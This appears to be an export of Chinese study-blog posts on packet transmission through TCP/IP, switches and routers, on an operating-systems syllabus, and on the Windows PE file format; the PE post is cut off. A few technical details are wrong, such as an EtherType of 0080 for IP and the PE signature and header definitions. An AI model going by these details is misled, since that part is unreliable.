<p>通过 DNS 获取到 IP 后，就可以把 HTTP 的传输工作交给操作系统中的<code>协议栈</code>。<br>协议栈的内部分为几个部分，分别承担不同的工作。上下关系是有一定的规则的，上面的部分会向下面的部分委托工作，下面的部分收到委托的工作并执行。</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1682581629432.png" alt="一个模型"></p>
<p><code>应用程序（浏览器）</code>通过调用 <code>Socket 库</code>，来委托协议栈工作。协议栈的上半部分有两块，分别是负责<code>收发数据</code>的 TCP 和 UDP 协议，它们两会接受应用层的委托执行收发数据的操作。</p>
<p>协议栈的下面一半是用 IP 协议<code>控制网络包收发操作</code>，在互联网上传数据时，数据会被切分成一块块的网络包，而将网络包发送给对方的操作就是由 IP 负责的。</p>
<p>IP 下面的网卡驱动程序负责控制网卡硬件，而最下面的网卡则负责完成实际的收发操作，也就是对网线中的信号执行发送和接收操作。</p>
<h2 id="TCP–可靠传输"><a href="#TCP–可靠传输" class="headerlink" title="TCP–可靠传输"></a>TCP–可靠传输</h2><h3 id="TCP报头的格式"><a href="#TCP报头的格式" class="headerlink" title="TCP报头的格式"></a>TCP报头的格式</h3><p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1682581629439.png" alt="报头格式"></p>
<p>现在可以先不看其他，只需要关注：<code>源端口</code>与<code>目标端口</code><br>只有知道这个端口，我们才知道应该发个哪一个应用。</p>
<blockquote>
<p>TCP 协议里面会有两个端口，一个是浏览器监听的端口（通常是随机生成的），一个是 Web 服务器监听的端口（HTTP 默认端口号是 80 ， HTTPS 默认端口号是 443 ）。</p>
</blockquote>
<h3 id="tcp报文的形成"><a href="#tcp报文的形成" class="headerlink" title="tcp报文的形成"></a>tcp报文的形成</h3><blockquote>
<p>在双方建立了连接后，TCP 报文中的数据部分就是存放 HTTP 头部 + 数据，组装好 TCP 报文之后，就需交给下面的网络层处理。</p>
</blockquote>
<p>经过传输层后，数据包的报文如下：<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1682581629431.png" alt="报文"></p>
<h2 id="IP-–远程定位"><a href="#IP-–远程定位" class="headerlink" title="IP –远程定位"></a>IP –远程定位</h2><blockquote>
<p>TCP 模块在执行连接、收发、断开等各阶段操作时，都需要委托 IP 模块将数据封装成网络包发送给通信对象。<br>这一操作位于网络层</p>
</blockquote>
<h3 id="IP报头格式"><a href="#IP报头格式" class="headerlink" title="IP报头格式"></a>IP报头格式</h3><p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1682581629556.png" alt="ip报头格式"></p>
<p>与上面的TCP报头一样，内容很多。这里我们记住：<code>源IP地址</code>与<code>目标IP地址</code></p>
<h3 id="IP报文生成"><a href="#IP报文生成" class="headerlink" title="IP报文生成"></a>IP报文生成</h3><p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1682581629566.png" alt="IP报文"></p>
<h2 id="MAC-–-两点传输"><a href="#MAC-–-两点传输" class="headerlink" title="MAC – 两点传输"></a>MAC – 两点传输</h2><blockquote>
<p>生成了 IP 头部之后，接下来网络包还需要在 IP 头部的前面加上 MAC 头部。<br>MAC 头部是以太网使用的头部，它包含了接收方和发送方的 MAC 地址等信息。</p>
</blockquote>
<p>MAC地址写写入网卡的，但是目标MAC要经过一个匹配的过程，这一点我们在介绍IP时说到过，即通过ARP协议帮我们找到这个地址。</p>
<h3 id="mac报文"><a href="#mac报文" class="headerlink" title="mac报文"></a>mac报文</h3><p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1682581629567.png" alt="mac报文"><br>内容接着上 IP报文，即在其基础上加上了MAC头，进行同一个链路的信息传输。</p>
<h2 id="网卡-–-出口"><a href="#网卡-–-出口" class="headerlink" title="网卡 – 出口"></a>网卡 – 出口</h2><blockquote>
<p>IP 生成的网络包只是存放在内存中的一串二进制数字信息，没有办法直接发送给对方。因此，我们需要将数字信息转换为电信号，才能在网线上传输，也就是说，这才是真正的数据发送过程。<br>负责执行这一操作的是网卡，要控制网卡还需要靠网卡驱动程序。</p>
</blockquote>
<p>网卡驱动从 IP 模块获取到包之后，会将其复制到网卡内的缓存区中，接着会在其开头加上报头和起始<br>帧分界符，在末尾加上用于检测错误的帧校验序列。<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1682581629568.png"></p>
<p>最后网卡会将包转为电信号，通过网线发送出去。</p>
<h2 id="交换机-–-送别者"><a href="#交换机-–-送别者" class="headerlink" title="交换机 – 送别者"></a>交换机 – 送别者</h2><blockquote>
<p>交换机的设计是将网络包原样转发到目的地。交换机工作在MAC 层，也称为二层网络设备。</p>
</blockquote>
<h3 id="交换机的包接收操作"><a href="#交换机的包接收操作" class="headerlink" title="交换机的包接收操作"></a>交换机的包接收操作</h3><blockquote>
<p>电信号到达网线接口，交换机里的模块进行接收，接下来交换机里的模块将电信号转换为数字信号。<br>通过包末尾的 FCS 校验错误，如果没问题则放到缓冲区。</p>
<blockquote>
<p>这部分操作基本和计算机的网卡相同，但交换机的工作方式和网卡不同。<br>计算机的网卡本身具有 MAC 地址，并通过核对收到的包的接收方 MAC 地址判断是不是发给自己的，如果不是发给自己的则丢弃；相对地，交换机的端口不核对接收方 MAC 地址，而是直接接收所有的包并存放到缓冲区中。因此，和网卡不同，交换机的端口<code>不具有 MAC 地址</code>。</p>
</blockquote>
</blockquote>
<blockquote>
<p>将包存入缓冲区后，接下来需要查询一下这个包的接收方 MAC 地址是否已经在 MAC 地址表中有记录了。<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1682581629569.png" alt="交换机的mac地址表"></p>
</blockquote>
<p>交换机根据 MAC 地址表查找 MAC 地址，然后将信号发送到相应的端口。<br>找不到指定的 MAC 地址,就将包转发到除了源端口之外的所有端口上，无论该设备连接在哪个端口上都能收到这个包。</p>
<blockquote>
<p>也就是说，交换机的作用就是把数据包送到子网的出口，也就是路由器。其本身没有MAC地址，只会被动的进行包的转移。</p>
</blockquote>
<h2 id="路由器-–-出境大门"><a href="#路由器-–-出境大门" class="headerlink" title="路由器 – 出境大门"></a>路由器 – 出境大门</h2><h3 id="路由器与交换机的区别"><a href="#路由器与交换机的区别" class="headerlink" title="路由器与交换机的区别"></a>路由器与交换机的区别</h3><blockquote>
<p>网络包经过交换机之后，现在到达了路由器，并在此被转发到下一个路由器或目标设备。<br>这一步转发的工作原理和交换机类似，也是通过查表判断包转发的目标。<br>不过在具体的操作过程上，路由器和交换机是有区别的。</p>
<ul>
<li>因为路由器是基于 IP 设计的，俗称三层网络设备，路由器的各个端口都具有 MAC 地址和 IP 地址；</li>
<li>而交换机是基于以太网设计的，俗称二层网络设备，交换机的端口不具有 MAC 地址。</li>
</ul>
</blockquote>
<p>换句话说，路由器的端口具有 MAC 地址，因此它就能够成为以太网的发送方和接收方；同时还具有 IP 地址，从这个意义上来说，它和计算机的网卡是一样的。当转发包时，首先路由器端口会接收发给自己的以太网包，然后路由表查询转发目标，再由相应的端口作为发送方将以太网包发送出去。</p>
<h3 id="路由器的包接收操作"><a href="#路由器的包接收操作" class="headerlink" title="路由器的包接收操作"></a>路由器的包接收操作</h3><blockquote>
<p>首先，电信号到达网线接口部分，路由器中的模块会将电信号转成数字信号，然后通过包末尾的 FCS进行错误校验。<br>这一步操作与交换机大致相同</p>
</blockquote>
<p>但是，不同的是，路由器会检查 MAC 头部中的接收方 MAC 地址，看看是不是发给自己的包，如果是就放到接收缓冲区中，否则就丢弃这个包。（这也是为什么交换机被允许把数据包发送给所有端口的原因）<br><code>完成包接收操作之后，路由器就会去掉包开头的 MAC 头部。</code></p>
<p>在确认包后，路由器会查询路由表，确定下一步发送的地址。这个过程以后会详细介绍，这里只需要知道在经过路由器的查询后，会出现两个结果：</p>
<ul>
<li>如果网关是一个 <strong>IP 地址</strong>，则这个IP 地址就是我们要转发到的目标地址，还未抵达终点，还需继续需要路由器转发。</li>
<li>如果<strong>网关为空</strong>，则 IP 头部中的接收方 IP 地址就是要转发到的目标地址，也是就终于找到 IP 包头里的目标地址了，说明已抵达终点。</li>
</ul>
<p>无论是什么结果，最终都会达到第二个结果，只不过是中间的过程不同。</p>
<blockquote>
<p>知道对方的 IP 地址之后，接下来需要通过 ARP 协议根据 IP 地址查询 MAC 地址，并将查询的结果作为接收方 MAC 地址。<br>接下来是发送方 MAC 地址字段，这里填写输出端口的 MAC 地址。还有一个以太类型字段，填写0080 （十六进制）表示 IP 协议。</p>
<blockquote>
<p>也就是这个时候会重新给数据包加上MAC头，以确保其到达目标IP地址。</p>
</blockquote>
</blockquote>
<p><code>在网络包传输的过程中，源 IP 和目标 IP 始终是不会变的，一直变化的是 MAC 地址，因为需要 MAC 地址在以太网内进行两个设备之间的包传输。</code></p>
<p><strong>至此，借用书上写的一段话：数据包通过多个路由器道友的帮助，在网络世界途经了很多路程，最终抵达了目的地的城门！城门值守的路由器，发现了这个小兄弟数据包原来是找城内的人，于是它就将数据包送进了城内，再经由城内的交换机帮助下，最终转发到了目的地了。</strong></p>
<h2 id="服务器与客户端-–-互相扒皮"><a href="#服务器与客户端-–-互相扒皮" class="headerlink" title="服务器与客户端 – 互相扒皮"></a>服务器与客户端 – 互相扒皮</h2><blockquote>
<p>服务器在接收到数据包后，会对它进行扒皮处理。<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1682581629576.png" alt="扒皮操作"></p>
</blockquote>
<blockquote>
<p>还是借用书上的一段描述，感觉特别详细：</p>
</blockquote>
<p>数据包抵达服务器后，服务器会先扒开数据包的 MAC 头部，查看是否和服务器自己的 MAC 地址符合，符合就将包收起来。</p>
<p>接着继续扒开数据包的 IP 头，发现 IP 地址符合，根据 IP 头中协议项，知道自己上层是 TCP 协议。</p>
<p>于是，扒开 TCP 的头，里面有序列号，需要看一看这个序列包是不是我想要的，如果是就放入缓存中然后返回一个 ACK，如果不是就丢弃。TCP头部里面还有端口号， HTTP 的服务器正在监听这个端口号。</p>
<p>于是，服务器自然就知道是 HTTP 进程想要这个包，于是就将包发给 HTTP 进程。</p>
<p>服务器的 HTTP 进程看到，原来这个请求是要访问一个页面，于是就把这个网页封装在 HTTP 响应报文里。</p>
<p>HTTP 响应报文也需要穿上 TCP、IP、MAC 头部，不过这次是源地址是服务器 IP 地址，目的地址是客户端 IP 地址。</p>
<p>穿好头部衣服后，从网卡出去，交由交换机转发到出城的路由器，路由器就把响应数据包发到了下一个路由器，就这样跳啊跳。</p>
<p>最后跳到了客户端的城门把手的路由器，路由器扒开 IP 头部发现是要找城内的人，于是又把包发给了城内的交换机，再由交换机转发到客户端。</p>
<p>客户端收到了服务器的响应数据包后，同样也非常的高兴，客户能拆快递了！</p>
<p>于是，客户端开始扒皮，把收到的数据包的皮扒剩 HTTP 响应报文后，交给浏览器去渲染页面，一份特别的数据包快递，就这样显示出来了！</p>
<p>最后，客户端要离开了，向服务器发起了 TCP 四次挥手，至此双方的连接就断开了。</p>
<blockquote>
<p>tcp的三次握手与四次挥手以后会学习</p>
</blockquote>
<blockquote>
<p>第一次计网知识记录到此为止。这一篇博客我们简要介绍了什么是ip，ip地址的划分，还涉及到了一个数据包的发送过程以及这个过程中各个层次的作用。<br>但是，计网的知识很多，上面的内容有很多疏漏，以后会单开一个专题进行记录计网学习过程中的知识点。<br>目前想到的一些知识点包括：ping的原理、http的相关、TCP的握手与挥手等，我们新专题见.</p>
</blockquote>
]]></content>
      <categories>
        <category>【-基础知识-】408专题</category>
        <category>计算机网络</category>
      </categories>
      <tags>
        <tag>计算机网络</tag>
      </tags>
  </entry>
  <entry>
    <title>（第2.5节）操作系统--学习内容</title>
    <url>/2022/08/08/%EF%BC%88%E7%AC%AC2.5%E8%8A%82%EF%BC%89%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F--%E5%AD%A6%E4%B9%A0%E5%86%85%E5%AE%B9/</url>
    <content><![CDATA[<blockquote>
<p>写在最前面：第一节我们介绍了操作系统的启动流程，第二节介绍了操作系统的系统调用与实现。下面我们就要深入操作系统，了解其组成部分与实现原理。</p>
<blockquote>
<p>不过在具体学习之前，需要对所学内容有一个清晰的认识，这也是本节内容的目的。这一节会从操作系统的历史出发，一步步总结归纳出操作系统的两大核心图谱。<br>参考资料：哈工大操作系统课程</p>
</blockquote>
</blockquote>
<h1 id="第一段历史–多进程图谱"><a href="#第一段历史–多进程图谱" class="headerlink" title="第一段历史–多进程图谱"></a>第一段历史–多进程图谱</h1><h2 id="历史简述"><a href="#历史简述" class="headerlink" title="历史简述"></a>历史简述</h2><p>下面4张图分别归纳了<strong>操作系统的发展历程</strong></p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1659922254312.png"></p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1659922269753.png"></p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1659922281080.png"></p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1659922298253.png"></p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1659922311585.png"></p>
<p>计算机的发明就是为了实现某些具体的工作，随着计算机在不同行业的普及，其需要实现的工作也越来越多。<br>而操作系统的目的就是为了帮助计算机更加方面、高效、可靠的完成这些功能。</p>
<h2 id="总结历史"><a href="#总结历史" class="headerlink" title="总结历史"></a>总结历史</h2><p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1659922382433.png"></p>
<p>随着<strong>社会需求</strong>的不断变化，计算机<strong>核心技术和思想</strong>也在与时俱进，从<strong>冯诺依曼思想</strong>到<strong>进程管理、多进程切换</strong>等，都是为了适应时代的需求。</p>
<p>思想和技术的发展需要软件来进行具体的实现，针对上述提到的众多思想，都有对应的<strong>操作系统软件</strong>来实现。</p>
<p>而从这一段历史可以得出：<code>多进程图谱是操作系统的核心部分！！</code></p>
<h1 id="第二段历史–文件操作图谱"><a href="#第二段历史–文件操作图谱" class="headerlink" title="第二段历史–文件操作图谱"></a>第二段历史–文件操作图谱</h1><h2 id="历史简述-1"><a href="#历史简述-1" class="headerlink" title="历史简述"></a>历史简述</h2><p>下面几张图归纳了操作系统的一段发展历程：</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1659922853396.png"></p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1659922865588.png"></p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1659922880013.png"></p>
<p>随着技术的不断发展和人民生活水平的提高，PC机开始普及，同时人们对于计算机使用感受更加重视，所以在前文计算机的基本结构上进行发展，图形化界面开始出现并逐渐成为主流。</p>
<h2 id="总结历史-1"><a href="#总结历史-1" class="headerlink" title="总结历史"></a>总结历史</h2><p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1659922916115.png"></p>
<p><code>文件操作系统图谱也是操作系统的核心部分！！</code></p>
<h1 id="我们的任务"><a href="#我们的任务" class="headerlink" title="我们的任务"></a>我们的任务</h1><h2 id="温故"><a href="#温故" class="headerlink" title="温故"></a>温故</h2><p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1659923622966.png"></p>
<p>在第一节我们就提过：<strong>操作系统是一个用于操作硬件的软件</strong>。</p>
<blockquote>
<p>那么这些硬件都有哪些呢？<br>如图所示，有<code>CPU、内存、IO设备和磁盘</code>等。而操作系统要做的就是实现对这些设备的操作。</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1659923642122.png"></p>
<p>在前面我同样介绍了<strong>操作系统的启动流程</strong>：<code>载入内存和系统建立</code>。</p>
<blockquote>
<p>其中系统建立的主要工作就是<strong>数据结构的初始化</strong>。就像我们要管理学生可以通过建立<strong>学生档案</strong>进行一样，管理硬件可以通过<strong>数据结构</strong>来进行，</p>
</blockquote>
<h2 id="知新"><a href="#知新" class="headerlink" title="知新"></a>知新</h2><p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1659923657199.png"></p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1659923674669.png"></p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1659923692683.png"></p>
<p>上图已经较为明确的介绍了我们需要学习的内容：<code>多进程视图和文件操作视图</code>。</p>
<blockquote>
<p>多进程视图：<strong>CPU管理</strong>和<strong>内存管理</strong></p>
</blockquote>
<blockquote>
<p>文件操作视图：<strong>IO管理</strong>、<strong>磁盘及文件管理</strong></p>
</blockquote>
]]></content>
      <categories>
        <category>【-基础知识-】408专题</category>
        <category>操作系统</category>
      </categories>
      <tags>
        <tag>操作系统</tag>
      </tags>
  </entry>
  <entry>
    <title>逆向工程--PE 结构详解</title>
    <url>/2022/11/09/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B--PE%20%E7%BB%93%E6%9E%84%E8%AF%A6%E8%A7%A3/</url>
    <content><![CDATA[<blockquote>
<p>写在最前面：本篇文章会介绍PE结构的相关知识，并通过PE根据分析实际文件进行进一步解析。</p>
</blockquote>
<ul>
<li><a href="#pe%E6%96%87%E4%BB%B6%E7%AE%80%E4%BB%8B">PE文件简介</a></li>
<li><a href="#pe%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84">PE文件结构</a><ul>
<li><a href="#%E7%BB%93%E6%9E%84%E5%85%A8%E8%B2%8C">结构全貌</a></li>
<li><a href="#dos-%E5%A4%B4%E9%83%A8%E8%AF%A6%E8%A7%A3image_dos_header">DOS 头部详解（IMAGE_DOS_HEADER）</a></li>
<li><a href="#pe-%E5%A4%B4%E9%83%A8%E8%AF%A6%E8%A7%A3image_nt_headers">PE 头部详解——IMAGE_NT_HEADERS</a><ul>
<li><a href="#pe%E6%A0%87%E8%AF%86%E7%AC%A6-signature">PE标识符–Signature</a></li>
<li><a href="#pe%E6%96%87%E4%BB%B6%E5%A4%B4-image_file_header">PE文件头–IMAGE_FILE_HEADER</a></li>
<li><a href="#%E5%8F%AF%E9%80%89%E5%A4%B4%E8%AF%A6%E8%A7%A3image_optional_header">可选头详解——IMAGE_OPTIONAL_HEADER</a><ul>
<li><a href="#%E5%9F%BA%E7%A1%80%E5%AD%97%E6%AE%B5-standard-fields">基础字段–Standard fields</a></li>
<li><a href="#nt%E9%99%84%E5%8A%A0%E5%AD%97%E6%AE%B5-nt-additional-fields">NT附加字段–NT additional fields</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#%E8%8A%82%E8%A1%A8%E8%AF%A6%E8%A7%A3image_section_header">节表详解——IMAGE_SECTION_HEADER</a></li>
</ul>
</li>
<li><a href="#%E4%B8%89%E7%A7%8D%E5%9C%B0%E5%9D%80%E5%8F%8A%E8%BD%AC%E6%8D%A2">三种地址及转换</a><ul>
<li><a href="#%E4%B8%89%E7%A7%8D%E5%9C%B0%E5%9D%80%E8%AF%A6%E8%A7%A3">三种地址详解</a></li>
<li><a href="#%E5%9C%B0%E5%9D%80%E8%BD%AC%E6%8D%A2">地址转换</a><ul>
<li><a href="#%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C">准备工作</a></li>
<li><a href="#%E7%9B%B8%E5%90%8C%E5%AF%B9%E9%BD%90%E5%80%BC%E7%9A%84%E5%9C%B0%E5%9D%80%E8%BD%AC%E6%8D%A2">相同对齐值的地址转换</a></li>
<li><a href="#%E4%B8%8D%E5%90%8C%E5%AF%B9%E9%BD%90%E5%80%BC%E7%9A%84%E5%9C%B0%E5%9D%80%E8%BD%AC%E6%8D%A2">不同对齐值的地址转换</a></li>
<li><a href="#%E9%80%9A%E8%BF%87%E5%B7%A5%E5%85%B7%E7%9B%B4%E6%8E%A5%E8%BD%AC%E6%8D%A2">通过工具直接转换</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#%E6%95%B0%E6%8D%AE%E7%9B%AE%E5%BD%95%E7%9B%B8%E5%85%B3%E7%BB%93%E6%9E%84%E8%AF%A6%E8%A7%A3">数据目录相关结构详解</a><ul>
<li><a href="#%E5%AF%BC%E5%85%A5%E8%A1%A8">导入表</a><ul>
<li><a href="#%E5%AF%BC%E5%85%A5%E8%A1%A8%E7%9A%84%E6%9F%A5%E7%9C%8B">导入表的查看</a></li>
<li><a href="#%E5%AF%BC%E5%85%A5%E8%A1%A8%E7%9A%84%E7%BB%93%E6%9E%84">导入表的结构</a></li>
<li><a href="#%E5%AF%BC%E5%85%A5%E8%A1%A8%E6%95%B4%E4%BD%93%E6%A6%82%E8%BF%B0">导入表整体概述</a></li>
</ul>
</li>
<li><a href="#%E5%AF%BC%E5%87%BA%E8%A1%A8">导出表</a><ul>
<li><a href="#%E5%AF%BC%E5%87%BA%E8%A1%A8%E6%A6%82%E8%BF%B0">导出表概述</a></li>
<li><a href="#%E5%AF%BC%E5%87%BA%E8%A1%A8%E7%9A%84%E7%BB%93%E6%9E%84">导出表的结构</a></li>
<li><a href="#%E5%AF%BC%E5%87%BA%E8%A1%A8%E5%AE%9E%E8%AE%AD">导出表实训</a></li>
</ul>
</li>
</ul>
</li>
</ul>
<h1 id="PE文件简介"><a href="#PE文件简介" class="headerlink" title="PE文件简介"></a>PE文件简介</h1><blockquote>
<p><code>PE（Portable Executable）</code>，即可移植的执行体。在 Windows 操作系统平台（包括 Win 9x、Win NT、Win CE 等）下，所有的<strong>可执行文件</strong>（包括 <strong>EXE 文件、DLL 文件、SYS 文件、OCX文件、COM 文件</strong>等）均使用 <strong>PE 文件结构</strong>。这些使用 PE 文件结构的可执行文件也可以称为<strong>PE 文件</strong>。</p>
</blockquote>
<ul>
<li><strong>windows 平台</strong>： <code>PE（Portable Executable）</code> 文件结构。</li>
<li><strong>Linux 平台</strong>：<code>ELF（Executable and Linking Format）</code> 文件结构</li>
</ul>
<p><strong>注</strong>：二者在<strong>结构上大同小异</strong>，所以这里以<strong>PE文件结构</strong>为例进行介绍。</p>
<h1 id="PE文件结构"><a href="#PE文件结构" class="headerlink" title="PE文件结构"></a>PE文件结构</h1><h2 id="结构全貌"><a href="#结构全貌" class="headerlink" title="结构全貌"></a>结构全貌</h2><p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1664972541776.png"></p>
<p>学习PE结构，先从<strong>全局入手</strong>。如上图所示，可以把可执行文件大致分为<strong>两个部分</strong>。</p>
<ul>
<li>其一的<code>DOS 头</code>、<code>PE 头</code>和<code>节表</code>属于构成可执行文件的<strong>数据管理结构或数据组织结构部分</strong></li>
<li>其二的<code>节表数据</code>才是可执行文件真正的<strong>数据部分</strong>，包含着程序执行时真正的代码、数据、资源等内容</li>
</ul>
<hr>
<blockquote>
<p>DOS 头分为两部分，分别是<code>“MZ 头部”</code>和<code>“DOS 存根”</code>。前者设置开始的两个字节为“MZ”，用于标识<strong>文件信息</strong>；后者则是用于<strong>输出提示字符串</strong>。</p>
</blockquote>
<blockquote>
<p>PE 头部保存着 Windows 系统<strong>加载可执行文件</strong>的重要信息。</p>
<blockquote>
<p>PE 头部由 <strong>IMAGE_NT_ HEADERS</strong> 定义，从该结构体的定义名称可以看出IMAGE_NT_HEADERS 是由多个结构体组合而成的，该结构体中包含<code>IMAGE_NT_SIGNATRUE</code>（它不是结构体，而是一个宏定义）、<code>IMAGE_FILE_HEADER</code> 和 <code>IMAGE_OPTIONAL_HEADER</code> 三部分。<br>PE 头部在 PE 文件中的位置不是固定不变的，PE 头部的位置由 <strong>DOS 头部的某个字段</strong>给出。</p>
</blockquote>
</blockquote>
<blockquote>
<p>PE 头部之后就是一个<strong>结构体数组</strong>构成的<code>节表</code>。节表中描述了各个节在整个<strong>文件中的位置</strong>与<strong>加载入内存后的位置</strong>，同时定义了<strong>节的属性</strong>（只读、可读写、可执行等）。如果 PE 文件中有 N 个节，那么节表就是由 N 个<code>IMAGE_SECTION_HEADER</code> 组成的数组。</p>
</blockquote>
<blockquote>
<p>可执行文件中的真正<strong>程序代码部分</strong>就保存在 PE 结构的<strong>节数据</strong>中，当然，数据、资源等内容也保存在节中。<em>节表只是描述了节数据的起始地址、大小及属性等信息。</em></p>
</blockquote>
<p><strong>注</strong>：对于PE结构的学习一定<strong>不要只抓细节</strong>，因为每一个部分都有很多结构体，每一个结构体中又有很多属性，这些属性不仅有其本身的含义还与其他部分关联。所以，在学习时要<strong>先理清整体体系</strong>，而后由各个部分入手，每一个部分也只需要先记住<strong>最重要的几个点</strong>即可。同时，要将PE文件的学习<strong>与计算机基础关联</strong>在一起。</p>
<p>闲话少说，我们下面<strong>开始正文的介绍</strong>。(以32位PE结构为例)。其中会涉及到很多代码部分，其来源为<code>winnt.h</code>头文件。</p>
<h2 id="DOS-头部详解（IMAGE-DOS-HEADER）"><a href="#DOS-头部详解（IMAGE-DOS-HEADER）" class="headerlink" title="DOS 头部详解（IMAGE_DOS_HEADER）"></a>DOS 头部详解（IMAGE_DOS_HEADER）</h2><p> 前面我们提到过，DOS头本质是一个<strong>结构体</strong>。下面我们来具体看一下这个结构体的内容：</p>
<p> <img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1665030703733.png"><br> <code>_IMAGE_DOS_HEADER</code>即为DOS头结构体。如上图所示，其中有很多属性，对此我们现在只需要掌握两个：</p>
<ul>
<li><code>e_magic</code>:是一个 <strong>DOS 可执行文件的标识符</strong>，占用 2 个字节。（也就是在文件开头定义为MZ字符）</li>
<li><code>e_lfanew</code>:此字段保存<strong>PE头的初始位置</strong>，占4个字节即32位地址。</li>
</ul>
<p>下面我们通过一个例子来更加清晰的理解这两个字段的含义。</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1665031209857.png"></p>
<p>如上图，开始两个字节<strong>e_magic字段</strong>，也就是MZ字符；框一是<strong>e_lifnew字段</strong>，用于定位到PE头。</p>
<p><strong>注</strong>：位于<strong>e_lfanew字段</strong>与<strong>PE头</strong>之间的数据就是<code>DOS存根</code>，用于<strong>输出提示信息</strong>，本身没什么用，不需要记。</p>
<h2 id="PE-头部详解——IMAGE-NT-HEADERS"><a href="#PE-头部详解——IMAGE-NT-HEADERS" class="headerlink" title="PE 头部详解——IMAGE_NT_HEADERS"></a>PE 头部详解——IMAGE_NT_HEADERS</h2><blockquote>
<p>前面就已经提到过，<code>IMAGE_NT_HEADERS</code>本身不是一个结构体，而是一个<strong>宏定义</strong>，由：<strong>PE标识符</strong>、<strong>文件头</strong>和<strong>可选头</strong>三者组成。其<strong>具体定义</strong>如下：<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1665031893372.png"><br>如上图，PE头部有三个属性，与上面的定义一一对应。下面我们就依次介绍这些结构体。</p>
</blockquote>
<h3 id="PE标识符–Signature"><a href="#PE标识符–Signature" class="headerlink" title="PE标识符–Signature"></a>PE标识符–Signature</h3><p>此部分就是PE标识符，占4个字节，内容可见上图的winhex界面。在winnt.h里也有一个宏定义：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_NT_SIGNATURE                  0x50450000  <span class="comment">// PE00</span></span></span><br></pre></td></tr></table></figure>

<p>该值非常重要。在<strong>判断一个文件是否是 PE 文件</strong>时，首先要判断文件的<code>起始位置是否为“MZ”</code>，如果是“MZ”，那么通过 DOS 头部的相应偏移取得“PE 头部的位置”，接着判断文件该位置的<code>前四个字节是否为“PE\0\0”</code>。如果是的话，则说明该文件是一个<strong>有效的 PE 文件</strong>。</p>
<h3 id="PE文件头–IMAGE-FILE-HEADER"><a href="#PE文件头–IMAGE-FILE-HEADER" class="headerlink" title="PE文件头–IMAGE_FILE_HEADER"></a>PE文件头–IMAGE_FILE_HEADER</h3><p><code>IMAGE_FILE_HEADER</code> 结构体的大小为 <strong>20 个字节</strong>，主要描述<strong>文件的相关信息</strong>，其<strong>具体定义</strong>如下：</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1665032486132.png"><br>下面就行具体属性的介绍：</p>
<ol>
